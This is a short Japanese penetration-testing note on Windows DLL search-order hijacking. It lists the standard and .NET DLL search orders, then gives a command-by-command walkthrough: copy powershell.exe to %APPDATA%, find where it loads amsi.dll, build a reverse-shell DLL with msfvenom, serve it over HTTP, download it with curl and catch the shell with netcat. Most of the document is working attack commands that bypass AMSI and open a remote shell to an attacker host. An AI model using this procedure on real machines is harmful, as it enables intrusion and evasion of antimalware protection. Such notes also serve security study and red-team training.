# DLL Search Order Hijack

## DLLを探す順番

1. 実行されたアプリケーションのディレクトリ
2. システムディレクトリ(C:\Windows\System32)
3. 16-bitシステムディレクトリ(C:\Windows\System)
4. Windowsディレクトリ
5. カレントディレクトリ
6. PATH環境変数で定義されたディレクトリ

``` batch
echo %PATH%
```

## DLLを探す順番(.NET Framework)

1. DEVPATH環境変数に列挙されているディレクトリ
2. グローバル・アセンブリ・キャッシュ(GAC)
3. アセンブリコードベース
4. 実行されたアプリケーションのディレクトリ
5. システムディレクトリ(C:\Windows\System32)

* 実際に使われるDLLのパスよりも先に検索されるパスに、悪意のあるDLLを配置することによって、悪意あるコードを実行させる攻撃手法
* 手順

``` batch
    # powershell.exeを実行権限のあるディレクトリにコピー
    copy　C:¥Windows¥System32¥WindowsPowerShell¥v1.0powershell.exe %APPDATA%¥powershell.exe
    # プロセスモニターを起動する。
    # powershell起動
    %APPDATA%¥powershell.exe
    # filter処理
    > ProcessName is powershell.exe then Include
    > Path contains amsi.dll then Include
    # amsi.dllをコピー
    # psは%XXX%ではなく{env:XXX}
    copy C:¥Windows¥System32¥amsi.dll {env:APPDATA}¥amsi.dll
    # powershellを実行してどのディレクトリ配下のamsi.dllが実行されるかを確認する
    %APPDATA%¥powershell.exe
    # 悪意あるdllファイルを上書き
    copy %USERPROFILE%¥Desktop¥Penetration¥hijack.dll %APPDATA%\amsi.dll
```

``` shell
    # kaliでmfsvenomを使いペイロードを作成
    sudo msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=<KaliのIP> LPORT=1234 -f dll > amsi.dll
    # webサーバ起動
    python -m http.server 8000
```

``` batch
    #ファイル転送　%APPDATA%で実行
    curl -O http://XXX.XXX.XXX.XXX:8000/amsi.dll
```

``` shell
    # kaliで待ち受け
    nc -lvnp 1234
```

``` batch
    #powershell実行でリバースシェルが張れる
    %APPDATA%\powershell.exe
```
